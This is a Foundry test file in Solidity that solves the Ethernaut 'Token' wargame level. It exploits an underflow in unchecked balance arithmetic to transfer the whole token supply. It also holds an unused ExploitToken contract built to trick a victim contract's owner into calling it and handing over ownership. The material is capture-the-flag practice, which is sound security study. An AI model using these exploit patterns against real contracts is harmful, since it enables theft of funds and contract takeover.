pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Token } from "src/Token/Token.sol";
import { TokenFactory } from "src/Token/TokenFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract ExploitToken {
    address victimSC;
    address public owner;
    
    constructor(address _victimSC) {
        victimSC = _victimSC;
        owner = msg.sender;
    }

    // attract owner of the victim SC to call this function in order to change the victim SC owner
    function pickMe() public {
        (bool success,) = victimSC.call(abi.encodeWithSignature("changeOwner(address)", owner));
        require(success, "Failed");
    }
}

contract TokenTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    
    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testTokenHack() external {
        // level setup
        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Token token = Token(payable(levelAddress));

        // attack
        assertEq(token.balanceOf(me), 20);

        address sidekick = makeAddr("sidekick");
        vm.startPrank(sidekick);
        // uncheckd ignore revert on overflow/underflow, so we can proceed to increase balance of recipient to an arbitrary amount 
        token.transfer(me, token.totalSupply());        

        changePrank(me);
        
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}

